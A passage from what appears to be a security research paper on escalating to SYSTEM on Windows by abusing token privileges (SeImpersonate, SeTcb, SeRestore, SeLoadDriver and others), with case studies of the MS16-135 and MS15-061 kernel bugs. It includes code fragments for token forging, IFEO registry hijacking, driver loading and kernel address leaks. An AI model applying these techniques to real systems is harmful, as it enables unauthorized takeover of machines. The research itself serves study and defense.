  IF the token level &lt; Impersonate THEN allow (such tokens are called
  “Identification” level and can not be used for privileged actions).  
  IF the process has “Impersonate” privilege THEN allow.  
  IF the process integrity level &lt;= the token integrity level AND 
  the process user == token user THEN allow ELSE restrict the 
  token to “Identification” level (no privileged actions possible).
 
--[ 2 - Modern Mitigations and Techniques
 
Windows 10 significantly improves upon the security of the Windows kernel,
both in overall reducing the attack surface and improving existing
defenses.  Microsoft continues to iterate on defensive mechanisms: KASLR
continues to receive much needed improvements (still many leaks), hardening
of often exploited structures for read/write primitives (tagWND), and
mitigating the revered NULL SecurityDescriptor technique [5].  As attackers
have demonstrated over the years, squashing individual strategies only
gives birth to newer ones, and the cycle continues.
 
In order to provide some context on the topics discussed, a brief
description of modern kernel mitigations and exploitation techniques
follows.  These sections are by no means authoritative or comprehensive,
and are meant only to reinforce the overall complexity and upfront
investment cost of modern kernel exploitation.  Go ask Ionescu if you have
questions.   
 
----[ 2.1 - Modern Windows Kernel Mitigations
 
Windows 10 and successive updates (Anniversary/Creators) have included a
number of exploit mitigation improvements, detailed by Skape et al. at
Blackhat 2016 [8].  We recommend reviewing the referenced slides for
further details and statistics on general Windows mitigation strategies.
We will focus on mitigations relevant to the topic at hand.
 
Kernel ASLR has seen improvement by enabling ASLR on various regions and
structures within the kernel.  Though this is a strong mitigation strategy
for remote kernel exploits, there exists several public and private
strategies for leaking object addresses in the kernel [9], and thus does
not pose much of a threat for the technique detailed here.  Core data
structures and memory regions once used for KASLR bypasses, such as the
HAL dispatch table, are now fully randomized.
 
The AppContainer, first introduced in Windows 8, provides sandboxing
capabilities for userland applications.  This control has been expanded upon in
Windows 10 to include win32k system call filtering which restricts the
process from abusing various win32k syscalls.  This is currently only 
(officially) enabled for the Edge browser, and thus is not very interesting.
 
A common kernel read/write primitive is the tagWND structure, which when
corrupted allows for arbitrary read/writes via
InternalGetWindowText/NtUserDefSetText. Exploits for MS15-061 and more 
recently MS16-135 were found to be taking advantage of this technique.  The 
Anniversary Update now provides additional bounds checks on this specific 
object, rendering it useless.  Though this form of technique squashing is 
rudimentary, a mere annoyance in having to find other rw primitives, it 
can be effective for breaking already deployed/developed chains.
 
The introduction of SMEP in Windows 8 means we can no longer ask the kernel
to execute userland shellcode for us.  Many bypasses have been used over
the years, some still effective, most not.  Evasion generally involves
disabling some principle of mitigation or getting code into the kernel (via
RWX regions or KROP).  Because we're not looking to execute any shellcode
within the kernel or even in userland, this mitigation does not apply.
 
Another interesting mitigation is the mythical Patchguard, formerly known
as Kernel Patch Protection, introduced many moons ago to the x64 NT kernel.
If you're unfamiliar with this mitigation, know that it is the kernel
boogeyman.  It monitors a random subset of checks, at random times, for
random reasons.  Its initialization and runtime behavior are obfuscated.
Its source code and behavior are obfuscated from even internal Windows
developers.  Skywing and Skape have previously done quite a bit of work
reversing and documenting portions of it, and should be referenced for
further tales of intrigue [18]. 
 
As of Windows 10, there are 44 different checks in Patchguard (visible via
!analyze -show 109), and while the authors are suspicious of the lists
completeness, there is no protection of process tokens.     

----[ 2.2 - Relevant Exploitation Strategies
 
Previous, related work that provided influence and indirect guidance for this
article's strategy is presented here.  These related techniques are briefly
detailed to provide background and to pay homage to those who came before
us.
 
Cesar Cerrudos Easy Local Windows Kernel Exploitation paper released at
Blackhat 2012 [1] introduced three different privilege escalation
strategies, and pointed many exploit devs towards the power of abusing
process tokens.  The first technique demonstrated in the paper details the
NULL ACL strategy, now partially mitigated, in which an arbitrary
write could be leveraged to NULL a privileged object's ACL.  This was and is a
very common strategy for effectively migrating into more privileged
processes.
 
The second Cerrudos strategy is a carpet bombing version of ours, in which an
arbitrary write could enable all privileges in a process token.  With these
privileges enabled, one could exploit SeDebugPrivilege and migrate into a
more privileged process, create tokens with SeCreateTokenPrivilege, or load
kernel drivers with SeLoadDriverPrivilege.
 
The third and final Cerrudos strategy is another technique very popular in 
modern EoP exploits, and involves replacing a process token with a SYSTEM 
token. This has been widely detailed from various perspectives elsewhere, 
and will not be repeated here.
 
Yin Liang and Zhou Li of Tencent conducted and released similar research at
Blackhat Europe 2016, in which they demonstrated abusing partial writes
with window objects in order to obtain rw primitives [11].  Much like our
work, they focused on partially controlled, limited write bugs such as
MS16-135 and CVE-2016-0174 in which the target of an OR or DEC may be
controlled.  In these cases, particularly those involving win32k, our
strategy obviates the need to obtain a primitive.
 
Moritz Jodeit published a great article on CVE-2014-4113, in which he
targeted the _SEP_TOKEN_PRIVILEGES structure with an uncontrolled write in
order to enable additional token privileges [12].  His technique is of
interest because it demonstrated, at the time, modern mitigation evasion
without any pointer overwrites or the execution of shellcode, with the
added benefit of a vastly simplified exploitation process.  
 
--[ 3 - Abusing Token Privileges

----[ 3.1 - Exploitable Privileges
 
For the purpose of this paper, we will define an “exploitable” privilege as
any token privilege that can be used alone to gain “NT AUTHORITY\SYSTEM”
level access to the target system. The term “exploit” is used loosely here,
in most cases these exploits are intended, albeit undocumented, behavior.
 
As was mentioned in section 1.2, the nt!_SEP_TOKEN_PRIVILEGES structure is
a binary field in the token where each bit determines whether a given
privilege is present or enabled in the token. The exact structure of this
bitmask, which bits correspond to which privileges, can be found in the
code released with this project, specifically the pykd script -
“tokenum.py”.
 
The remainder of this section deals with the details of each privilege we
were able to successfully abuse to gain elevated privileges. Code samples
to take advantage of each of these privileges are included with this
project.
 
------ [ 3.1.1 - SeImpersonatePrivilege
 
The SeImpersonatePrivilege is described on MSDN as “User Right: Impersonate
a client after authentication.” This is the privilege referred to in
section 1.4, in the second step, when checking whether a specific process can
impersonate a given token. Any process holding this privilege can
impersonate any token for which it is able to get a handle. It should be
noted that this privilege does not allow for the creation of new tokens.
 
This particular privilege is quite interesting because it is required by a
number of common Windows service accounts, such as LocalService and those
for MSSQL and IIS. An “exploit” for this privilege then would also yield
elevation of privilege if any such accounts were compromised. This was the
subject of previous work by the authors [6].
 
In [20], a method to gain a handle to a token for the “NT AUTHORITY\SYSTEM”
account is described. Basically a Windows service (DCOM) is passed a
specially crafted object that contains a reference to an attacker
controlled TCP listener on the local machine. When Windows tries to resolve
this reference, the attacker requests NTLM authentication and then relays
the NTLM authentication sent to the listener to create a new token on the
local machine. This token will be for the user “NT AUTHORITY\SYSTEM” and
have full administrative privilege.
 
Any user can perform the previously described procedure to gain a handle to
a token for the “NT AUTHORITY\SYSTEM” user, however in order to make use of
this handle, the ability to impersonate is required; the
SeImpersonatePrivilege allows us to do just that. All that is required to
spawn a new process with the elevated token is to call the
CreateProcessWithToken function, passing the new token as the first
argument.
 
------ [ 3.1.2 - SeAssignPrimaryPrivilege
 
The SeAssignPrimaryPrivilege is offensively very similar to the previously
discussed SeImpersonatePrivilege. It is needed to “assign the primary token
of a process”. Our strategy will be to spawn a new process using an
elevated token.
 
In order to create a new process with a privileged token, we will first
need to get a handle to such a token. To do this, we follow the procedure
described in [20] and briefly outlined in section 3.1.1.
 
As the name of this privilege implies, it allows us to assign a primary
token to a new or suspended process.  Using the strategy outlined in 3.1.1
to obtain a token, we find ourselves with a privileged impersonation token,
and thus will need to first derive a primary token from it.  This can be
accomplished via the DuplicateTokenEx function:
 
  DuplicateTokenEx(hClientToken, TOKEN_ALL_ACCESS, 
                   NULL, SecurityAnonymous,
                   TokenPrimary, &amp;hDupedToken);
 
With a privileged primary token in hand, we now have a few options.
Unfortunately, we cannot simply swap the token of our currently running
process for the elevated one, as changing primary tokens on running
processes is not supported behavior.  This is controlled by the
PrimaryTokenFrozen field in the EPROCESS structure.
 
The simplest option is to make a call to “CreateProcessAsUser” using the
new token as an argument to create a new, highly privileged process.
 
Alternatively, we can spawn a new process in the suspended state and 
perform the same operation as above. When a new processes is created 
with a call to CreateProcess(..., CREATE_SUSPENDED, ...), the value for
PrimaryTokenFrozen is not yet set, allowing the token to be swapped.
 
A corollary to the previous point is that in some partial write
exploitation scenarios, we can actually swap the token of the currently
running process for an elevated one. If we can cause the PrimaryTokenFrozen
field to be unset through our partial write, assuming we possess, or can
gain SeAssignPrimaryTokenPrivilege, we can then call
NtSetInformationProcess to swap the old token for the new one. Since
PrimaryTokenFrozen is a single bit field, the surrounding fields are
relevant because they will likely be trashed by any sort of partial write:
 
  +0x0c8 RefTraceEnabled  : Pos 9, 1 Bit 
  +0x0c8 DisableDynamicCode : Pos 10, 1 Bit
  +0x0c8 EmptyJobEvaluated : Pos 11, 1 Bit
  +0x0c8 DefaultPagePriority : Pos 12, 3 Bits
  +0x0c8 PrimaryTokenFrozen : Pos 15, 1 Bit
  +0x0c8 ProcessVerifierTarget : Pos 16, 1 Bit
  +0x0c8 StackRandomizationDisabled : Pos 17, 1 Bit
 
If for example you've got an arbitrary decrement, as in MS15-061, you can
unset the TokenPrimaryFrozen bit and swap your process token out:
 
  NtSetInformationProcess(hCurrentProcess, 
                          (PROCESS_INFORMATION_CLASS)0x09,
                          &amp;hElevatedPrimaryToken, 8);
 
------ [ 3.1.3 - SeTcbPrivilege
 
SeTcbPrivilege is quite interesting, MSDN describes it as “This privilege
identifies its holder as part of the trusted computer base. Some trusted
protected subsystems are granted this privilege.” In addition to this, a
number of books, articles, and forum posts describe the TCB privilege as
being equivalent to fully privileged access to the machine. However,
despite all this, no publicly available resources seem to indicate HOW the
SeTcbPrivilege can be used, on its own, to perform privileged operations.
 
We began by analyzing MSDN documentation, trying to find which Windows API
calls were restricted to accounts with SeTcbPrivilge. In the documentation
for the LsaLogonUser function, we find the following as the first
parameter:
 
LsaHandle [in] A handle obtained from a previous call to
LsaRegisterLogonProcess.  The caller is required to have SeTcbPrivilege
only if one or more of the following is true:
 
  + A Subauthentication package is used.
  + KERB_S4U_LOGON is used, and the caller requests an impersonation token.
  + The LocalGroups parameter is not NULL.
 
  If SeTcbPrivilege is not required, call LsaConnectUntrusted to obtain
  the handle.
 
Normally the LsaLogonUser API call is used to authenticate a user with some
form of credentials, however we are assuming that we have no knowledge of
the target system and its users. Further, which user will we attempt to
logon? Finally, how will we impersonate the resulting token since we do not
have SeImpersonatePrivilege? 
 
Thankfully James Forshaw chimed in with a very useful &lt;140 character
message:
 
  “you could use LsaLogonUser to add admin group to a token of your own user,
  then impersonate.” 
 
There is an interesting logon type in Windows known as S4U logon (and
referenced above as KERB_S4U_LOGON). It is effectively described in an MSDN
blog post [19] as follows:
 
  “In Windows, it is possible to logon as a different domain user without any
  credentials.  This is known as a S4U or a Service For User Logon.  This is
  a Microsoft Extension to Kerberos introduced with Windows Server 2003.”
 
This seems to fit what we are trying to do perfectly; using the S4U logon
type, we can obtain a token for any user. Referring back to the
documentation for the LsaHandle parameter above, if we have SeTcbPrivilege,
apparently the resulting token can be an “impersonation” token, meaning we
can assign it to a thread.
 
Referring again to the LsaHandle parameter, the last bullet point implies
that we can call LsaLogonUser with SeTcbPrivilege and add arbitrary groups
to the resulting token returned by this call. We will add the group SID
“S-1-5-18” to the token, this is the SID for the Local System account and
if we are using a token that possesses it, we will have full privilege on
the system.  Adding the SYSTEM SID is quite straightforward:
 
  WCHAR systemSID[] = L&quot;S-1-5-18&quot;; 
  ConvertStringSidToSid(systemSID, &amp;pExtraSid);

  pGroups-&gt;Groups[pGroups-&gt;GroupCount].Attributes = 
                    SE_GROUP_ENABLED | SE_GROUP_MANDATORY; 
  pGroups-&gt;Groups[pGroups-&gt;GroupCount].Sid = pExtraSid;
  pGroups-&gt;GroupCount++;
 
The only piece remaining in this puzzle is how we will use the resulting
impersonation token, since we are assuming that we have SeTcbPrivilege, but
no other impersonation related privileges. Referring back to section 1.4 on
the rules related to token impersonation, we can see that we should be able
to impersonate the token without any special privileges as long as the
token is for our current user and the integrity level of the token is
“Medium”. So using the token returned by LsaLogonUser, we simply set the
integrity level to “Medium” and then call SetThreadToken to replace our
current thread's token with the new one.  
 
------ [ 3.1.4 - SeBackupPrivilege
 
The SeBackupPrivilege is described on MSDN as follows:
 
  “Required to perform backup operations. This privilege causes the system to
  grant all read access control to any file, regardless of the access control
  list (ACL) specified for the file. Any access request other than read is
  still evaluated with the ACL. This privilege is required by the RegSaveKey
  and RegSaveKeyExfunctions. The following access rights are granted if this
  privilege is held: -READ_CONTROL -ACCESS_SYSTEM_SECURITY -FILE_GENERIC_READ
  -FILE_TRAVERSE”
 
To use this privilege for EoP, we read the password hashes of local
Administrator accounts from the registry and then pass these to a local
service from which we can get code execution, the most popular technique
here would simply be passing the hash with “psexec” or “wmiexec”. 
 
Unfortunately for us there are two caveats in this scenario.  First, many
organizations over the past several years have begun to disable local
administrator accounts. Second, even in cases where some local
administrator accounts remain enabled, Microsoft implemented a change in
Windows Vista and newer where only the RID 500 (the default local
Administrator) account can administer the machine remotely by default:
 
  When a user who is a member of the local administrators group on the
  target remote computer establishes a remote administrative
  connection…they will not connect as a full administrator. The user has
  no elevation potential on the remote computer, and the user cannot
  perform administrative tasks.
 
In our experience however, it is still fairly common in enterprise
environments to find the RID 500 local administrator account enabled.
 
------ [ 3.1.5 - SeRestorePrivilege
 
The restore privilege is described as being “required to perform restore
operations”, and causes the system to grant all write access control to any
file on the system, regardless of the files ACL.  Additionally, this
privilege allows the holding process or thread to change the owner of a
file.  The implications of obtaining this privilege should be obvious.
 
In order to use this privilege, one must supply the
FILE_FLAG_BACKUP_SEMANTICS flag to supporting APIs.  This tips the kernel
off that the requesting process might have SeBackupPrivilege or
SeRestorePrivilege enabled, and to check for it before short circuiting the
DACL check.  Keen observers may infer from the terse description of the
privilege on MSDN that this also allows for the creation or modification of
registry keys.
 
Arbitrary writes to HKLM opens up infinite potential for privilege
escalation.  We chose to use the Image File Execution Options key, used for
debugging software on a system.  When a system binary is launched, if an
HKLM entry exists for it at HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options and it contains a Debugger
key, it will execute the set entry.  This technique is fairly common for
malware persistence and privilege escalation vulnerabilities [7].
Exploitation simply requires opening the registry, specifying the backup
flag, and creating the key:
 
  RegCreateKeyExA(
    HKEY_LOCAL_MACHINE, 
    “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
                                    Execution Options\wsqmcons.exe”, 
    0, NULL,
    REG_OPTION_BACKUP_RESTORE, 
    KEY_SET_VALUE, 
    NULL, 
    &amp;hkReg, 
    NULL);
 
  RegSetValueExA(hkReg, 
    &quot;Debugger&quot;, 0, REG_SZ, 
    (const BYTE*)regentry,
    strlen(regentry) + 1);
 
In the above sample we used wsqmcons, a consolidator service that runs as
SYSTEM and is triggerable by a standard user on the system.  
 
In addition to adding registry entries, one could also drop DLLs into
system folders for DLL hijacking, overwrite critical system resources, or
modify other services.      
 
------ [ 3.1.6 - SeCreateTokenPrivilege
 
The “SeCreateTokenPrivilege” allows users to create primary tokens via the
ZwCreateToken API. Unfortunately, this right alone does not allow the user
to use the token they have just created. Therefore naive attempts to create
and use tokens for high privileged users such as “NT AUTHORITY\SYSTEM” will
not succeed.
 
Recall the rules for token impersonation from section 1.4. A user is
allowed to impersonate a token even without SeImpersonatePrivilege so long
as the token is for the same user and the integrity level is less than or
equal to the current process integrity level.
 
In order to leverage SeCreateTokenPrivilege, we need only craft a new
impersonation token that matches the requesting token with the addition of
a privileged group SID.  This is in theory pretty simple to do, but the API
for these interfaces and ZwCreateToken is not very friendly.  Most of the
fields we can query from our executing token via GetTokenInformation, with
only a few exceptions.
 
As mentioned, we want to enable the local administrator group on the token.
To do this, we build a SID using the RID of the group:
 
  SID_BUILTIN SIDLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32,
                                    DOMAIN_ALIAS_RID_ADMINS } };
 
We then iterate over the token's groups and elevate it from user to
administrative membership:
 
  for (int i = 0; i &lt; groups-&gt;GroupCount; ++i, pSid++) { 
    PISID piSid = PISID)pSid-&gt;Sid; 
    if (piSid-&gt;SubAuthority[piSid-&gt;SubAuthorityCount - 1] == 
            DOMAIN_ALIAS_RID_USERS){ 
      memcpy(piSid, &amp;TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));
      pSid-&gt;Attributes = SE_GROUP_ENABLED; 
    } 
  }
 
The final change is ensuring that we're building a TokenImpersonation
token.  This can be set in the token's object attributes:
 
  SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), 
                                       SecurityImpersonation,
                                       SECURITY_STATIC_TRACKING, FALSE }; 
  OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &amp;sqos };
 
Provided we maintain the token user and integrity level, we can finally use
the token and impersonate the executing thread.  
 
------ [ 3.1.7 - SeLoadDriverPrivilege
 
The LoadDriver privilege is described by Microsoft as “User Right: Load and
unload device drivers”. The fact that device drivers run in the kernel
makes this a very desirable privilege.
 
Our goal then is to execute arbitrary code in the kernel given only
SeLoadDriverPrivilege and to bypass any driver signing requirements in the
process; a tall order. Most documentation on this privilege and the
associated “NtLoadDriver” Windows API call assumes that the caller has
additional privilege on the system, specifically the ability to write to
the HKLM (HKEY_LOCAL_MACHINE) section of the Windows registry.
 
The format of the Windows API call to load a driver is as follows:
 
  NTSTATUS NtLoadDriver( _In_ PUNICODE_STRING DriverServiceName);
 
  DriverServiceName [in] Pointer to a counted Unicode string that specifies a
  path to the driver's registry key,
  \Registry\Machine\System\CurrentControlSet\Services\DriverName, where
  DriverName is the name of the driver.
 
The DriverServiceName parameter is a pointer to a registry location. Under
the “DriverName” key, there should be at least the following two values:
 
  + ImagePath - A string in the format “\??\C:\path\to\driver.sys” 
  + Type - A DWORD that should be set to “1”
 
Notice the “DriverServiceName” parameter format supposedly (according to
the documentation) must begin with “\Registry\Machine” which is a reference
to the HKLM registry key for which we are assuming we do not have access.
In order to circumvent this obstacle, we can actually use a path that
points to HKCU (HKEY_CURRENT_USER) instead such as
“\Registry\User\S-1-5-21-582075628-3447520101-2530640108-1003\”. Here the
numeric ID in the string is the RID for our current user.  We must do this
because the kernel doesn't know what HKCU is, as it's purely a userland
helper that points into the HKLM hive.
 
Since “System\CurrentControlSet\Services\DriverName” does not exist under
this path we must create it, which we can do since it is the current user's
registry hive.  The format for loading a simple driver is fairly
straightforward.  We must, at minimum, define two things:
 
  + REG_DWORD Type 
  + REG_SZ ImagePath
 
The type defines the service, as listed in wdm.h:
 
  #define SERVICE_KERNEL_DRIVER          0x00000001 
  #define SERVICE_FILE_SYSTEM_DRIVER     0x00000002 
  #define SERVICE_ADAPTER                0x00000004 
  #define SERVICE_RECOGNIZER_DRIVER      0x00000008 
  [....]
 
In our case, we'll use the SERVICE_KERNEL_DRIVER type.  Once these values
are set, we can then invoke NtLoadDriver with a path to our registry key
and load the driver into the kernel.
 
There are several other strategies that can be used to load kernel mode
drivers, such as the FltMgr or condrv key, but these cannot be used without
administrative privileges in the first place.
 
------ [ 3.1.8 - SeTakeOwnershipPrivilege
 
This privilege is, offensively, similar to SeRestorePrivilege.  According
to MSDN, it allows a process to “take ownership of an object without being
granted discretionary access” by granting the WRITE_OWNER access right.
Exploiting this privilege is very similar to SeRestorePrivilege, except we
first need to take ownership of the registry key we want to write to.
 
Taking ownership of the registry key requires building an ACL with updated
ownership, then modifying the DACL so that we can write into it.  Building
an ACL requires the construction of an EXPLICIT_ACCESS object:
 
  ea[0].grfAccessPermissions = KEY_ALL_ACCESS;
  ea[0].grfAccessMode = SET_ACCESS; 
  ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
  ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID; 
  ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER; 
  ea[0].Trustee.ptstrName = (LPTSTR)user-&gt;User.Sid; // owner 
 
We can then use SetEntriesInAcl to build the ACL object.  Once the ACL
object is composed, we take ownership of the registry path:
 
  SetNamedSecurityInfo(
        _TEXT(&quot;MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion
                \\Image File Execution Options&quot;), 
        SE_REGISTRY_KEY,
        OWNER_SECURITY_INFORMATION, 
        user-&gt;User.Sid, 
        NULL, NULL, NULL);
 
Once we own the registry key, we make one last call to SetNamedSecurityInfo
to enable the previously composed ACL and gain write privileges to the
entry:
 
    SetNamedSecurityInfo(_TEXT(&quot;MACHINE\\SOFTWARE\\Microsoft\\Windows
                            NT\\CurrentVersion\\Image File Execution Options&quot;), 
                        SE_REGISTRY_KEY, // type of object 
                        DACL_SECURITY_INFORMATION,   // change DACL 
                        NULL, NULL, // do not change owner or group 
                        pACL, // DACL specified 
                        NULL);
 
At this point we can follow the same steps taken via the SeRestorePrivilege
method, making sure to restore registry ownership once we're done.
 
Much like SeRestorePrivilege, we can also take control of critical system
files or folders to abuse DLL load order or other such techniques.  
 
------ [ 3.1.9 - SeDebugPrivilege
 
SeDebugPrivilege is very powerful, it allows the holder to debug another
process, this includes reading and writing to that process' memory. This
privilege has been widely abused for years by malware authors and exploit
developers, and therefore many of the techniques that one would use to gain
EoP through this privilege will be flagged by modern endpoint protection
solutions.
 
There are a host of various memory injection strategies that can be used
with this privilege that evade a majority of AV/HIPS solutions.  Finding
these is left as an exercise for the reader.
 
----[ 3.2 - Exploiting Partial Writes
 
With an understanding of how individual privileges can be exploited, we can
now begin to demonstrate how and why these might be useful to us.  Case
studies will be discussed further in section 4.
 
This technique was born from attempts at evading various kernel and
userland mitigations via partial write exploits.  To establish a familiar
vernacular, a partial write is an instruction in which the destination is
controlled, but the value written may not be.  Or the value may be a single
bit or byte modification, such as a decrement or addition.  Take for
example a DEC operation; if the destination address can be controlled, then
we've got the ability to arbitrarily decrement any address by one.  The OR
instruction is another example; while we may control the destination in
which we perform the OR operation, we might not control the value in which
we OR it with: OR DWORD PTR[controlled], 4.
 
Commonly, exploiting these would require modifying object fields, such as a
length, in order to obtain an arbitrary or partial read/write primitive.
Others may make modifications to page tables or mangle other kernel mode
data structures.  These are all pieces to a larger exploit chain that
generally ends in NULLing an ACL, swapping process tokens, or executing a
privileged usermode process.  Privileged execution (see:payload) changes
with the mitigation landscape.
 
Instead of trying to execute ROP in the kernel or mangle kernel objects,
why not delegate the escalation of privileges to userland?  Much like the
process swapping strategy, if we can enable elevated privileges in
userland, we stand to benefit from increased reliability, trivial
sidestepping of various kernel mitigations, and increased flexibility in
the deliverance of some malicious payload.  We want to persist on a system
unimpeded, and to do so we must remain clandestine.  
 
As discussed in section 1.2, each token has a _SEP_TOKEN_PRIVILEGES
structure containing what privileges a token currently holds.  Our path
towards elevation should be pretty obvious: by abusing a partial write and
a userland information leak, we can flip a few bits in our process token
and obtain access to administrative privileges.  Because we often cannot
control the value being written, it's important that all possible values
allow for elevation.  We've identified three bytes in which do not grant
administrative privileges: 0x00, 0x40, 0x41.  That is, if you were to
obtain a MOV BYTE PTR[controlled], 0x41 primitive, you would not be able to
enable an exploitable privilege.  This assumes a MOV operation on default
privilege bitmasks; other operations or combinations of privileges may
grant elevated privileges.  All other values provide access to an
exploitable privilege.
 
In order to target this process token, we must be able to obtain the
address of a controlled processes token.  As we're targeting privilege
escalation vulnerabilities with this strategy, we can use and continue to
use (as of v1703) the common NtQuerySystemInformation API to leak our
process token address, as demonstrated below:
 
  NtQuerySystemInformation(16, bHandleInfo, 
                          sizeof(bHandleInfo),
                          &amp;BytesReturned));

  PSYSTEM_HANDLE_INFORMATION shiHandleInfo = 
                    (PSYSTEM_HANDLE_INFORMATION)bHandleInfo;
  PSYSTEM_HANDLE_TABLE_ENTRY_INFO hteCurrent= &amp;shiHandleInfo&gt;Handles[0];

  for (i = 0; i&lt;shiHandleInfo&gt;NumberOfHandles; hteCurrent++, i++) { 
    if(hteCurrent&gt;UniqueProcessId == dwPid &amp;&amp; 
            hteCurrent&gt;HandleValue == (USHORT)hToken) 
        return hteCurrent&gt;Object; 
  }
 
The dwPid value is the process in which the token exists, and the hToken is
a handle to the process token.  Note that, as of Windows 8.1 this strategy
no longer works under Low integrity processes, and thus other methods will
need to be employed.  For brevity and clarity, we will work under the
assumption that we're targeting privilege escalation from a Medium
integrity process (default IL for users) and rely on the above technique.
 
----[ 3.3 - Abusing Existing Service Accounts
 
In addition to being useful for local privilege escalation through
arbitrary write primitives in the kernel, these same techniques can be of
use in the more common scenario where an attacker is accessing the machine
as a local service account.
 
There are a number of common scenarios where an attacker is able to execute
code in the context of a service account on a target machine, including the
following:
 
  + The service itself is compromised through some vulnerability. Typical
    scenarios include web application vulnerabilities which allow execution
    in the context of the account running IIS, and SQL injection 
    vulnerabilities where XP_CMDSHELL can be used to run code in the 
    context of the SQL service account.
 
  + Service account credentials are leaked in some way.
 
  + Kerberoast style attacks. A Kerberos ticket is requested for the target
    account from the domain controller. Part of this ticket is encrypted
    using the target account's password hash. This can be efficiently 
    cracked offline to yield the account password.
 
In any of these scenarios, if the service account happens to have one of
the privileges outlined in the previous section, it is possible to gain
local privilege escalation simply by leveraging the corresponding module
from this project.
 
----[ 3.3.1 - Common Service Accounts
 
In this section, we will give brief examples of some common service
accounts that can be abused for EoP due to their default token privileges.
 
----[ 3.3.1.2 - MSSQL / IIS
 
If we examine the default privileges assigned to the MSSQL and IIS service
accounts using the “AccessChk” tool from Sysinternals, we find the
following:
 
  + IIS - SeImpersonatePrivilege - BUILTIN\IIS_IUSRS
  + MSSQL - SeAssignPrimaryTokenPrivilege - 
                            NT SERVICE\SQLAgent$SQLEXPRESS, 
                            NT SERVICE\MSSQLLaunchpad$SQLEXPRESS, 
                            NT SERVICE\MSSQL$SQLEXPRESS
                                           
These privileges are sufficient for EoP by leveraging the modules in this
project. Compromise of these accounts is a very common penetration testing
scenario. Any time SQL injection in MSSQL, or a web application
vulnerability in IIS is exploited to gain command execution, the attackers
end up with these privileges. Traditionally, this was considered a limiting
scenario with a restricted local account and an attacker would need to
resort to another method for EoP. Using the techniques outlined in this
paper, it is simply a matter of abusing existing token privileges.
 
----[ 3.3.1.3 - Backup Products
 
Every commercial backup product on the market will run with some sort of
elevated privilege. In many cases, the backup service account will run with
SYSTEM privileges, making EoP unnecessary. Where administrators have
started to smarten up however, we are starting to see the privileges on
these accounts become more restricted. 
 
The following are the minimum privileges required by the Veritas NetBackup
solution, shamelessly borrowed from their website
(https://www.veritas.com/support/en_US/article.TECH36718):
 
  + *Act as a part of Operating System ( Only for Windows Server 2000 ).
  + *Create a token object.
  + Log on as a service.
  + Logon as a batch job.
  + Manage auditing and security log.  
  + *Backup files and directories.
  + *Restore files and directories.
 
Note the 4 items in the list that we've marked with an asterisk (*). Any
one of these privileges alone can be leveraged for EoP given one of the
techniques described in this project.
 
----[ 3.3.1.4 - Local Service Accounts 
There are also pre-defined service accounts on every Windows machine that 
contain privileges that can be leveraged for EoP. These are 
“NT AUTHORITY\SERVICE”, “NT AUTHORITY\NETWORK SERVICE”, and 
“NT AUTHORITY\LOCAL SERVICE”.
 
Each of these has slightly different privileges, some contain multiple
exploitable privileges, however they all have access to the exploitable
SeImpersonatePrivilege.
 
If an attacker is somehow able to gain access to the system under the
context of one of these limited local accounts, they can trivially elevate
their privileges to “NT AUTHORITY\SYSTEM” using the techniques outlined
above.
 
--[ 4 - Kernel Exploit Development Case Studies
 
We'll now detail several case studies that demonstrate how and why we may
want to delegate privileged exploitation to userland.  Note that our
strategy applies towards elevation of privilege; it cannot, in its current
state, be used remotely.
 
----[ 4.1 - MS16-135
 
MS16-135 is the bug that we first wrote an exploit for using this strategy,
and proves to be a fantastic case study.  Initially released by Google
after identifying active exploitation in the wild [13], a trigger was
quickly released and the race for weaponization began.
 
One of the first public demonstrations of exploitability was by Enrique
Nissim at Zero Nights 2016 [14], in which he used the bug to demonstrate
PML4 randomization weaknesses.  Several other proof of concepts followed in
suit, most abusing the PML4 strategy, others using the pvscan0 technique.
The bug can be triggered via SetWindowLongPtr with a specifically crafted
window and index value.  The result is a controlled OR operation: OR DWORD
PTR[controlled], 4.  The first step is identifying the address of
_SEP_TOKEN_PRIVILEGES.  This can be accomplished using the following:
 
  OpenProcessToken(OpenProcess(PROCESS_QUERY_INFORMATION, 
                               1, GetParentProcessId()),
                   TOKEN_QUERY | TOKEN_QUERY_SOURCE, 
                   &amp;current_token);

  dwToken = (UINT)current_token &amp; 0xffff; 
  _TOKEN =  GetHandleAddress(GetCurrentProcessId(), dwToken);
  startTokenOffset = (UINT)_TOKEN + 0x40;
 
We first open a handle to our parent process token, then use a
NtQuerySystemInformation wrapper function to fetch the actual address of
the token.  The structure we're after lies 0x40 bytes ahead.  Note that the
NtQuerySystemInformation leak only works from medium integrity processes on
Windows 8.1+.  In order to exploit this from a low integrity process, we
will need to abuse a different leak [9].
 
With the token address, we now adjust the offset to the enabled bitmask and
invoke:
 
  ULONG enabled_create_token = startTokenOffset + 0xa;
  SetWindowLongPtr(childWnd, GWLP_ID, (LONG)(enabled_create_token - 0x14));
 
Should we trigger this bug multiple times while shifting the offset, we can
hit each byte in the Enabled bitmask.  This enables the following
privileges:
 
  02 0x000000002 SeCreateTokenPrivilege            Attributes - Enabled 
  10 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled
  18 0x000000012 SeRestorePrivilege                Attributes - Enabled
  23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled

As we've seen, three of the four privileges enabled are trivially
exploitable.  Our proof of concept code opts to abuse the
SeRestorePrivilege, and can be found in the project git repository [3].
 
Though many of the public exploits for this bug were written in such a way
to demonstrate a technique, we find that the presented example highlights
the simplicity and reliability of our strategy: it relies only on the
external need to leak a token address from the kernel.  Public proof of
concepts are much more complicated and require a variety of primitive
grooming and kernel dancing.
 
----[ 4.2 - MS15-061
 
This was another fantastic bug observed in the wild during the RussianDoll
campaigns and was quickly reversed and weaponized within the community.
Much like MS16-135, this is a partial write that allows for the decrement
of a controlled address.  The bug was a use after free in win32k,
specifically yet another issue with usermode callbacks emanating from
within win32k [15].
 
Our strategy here does not differ much from the example in 4.1: we identify
our token address, groom the heap to obtain our arbitrary decrement, and
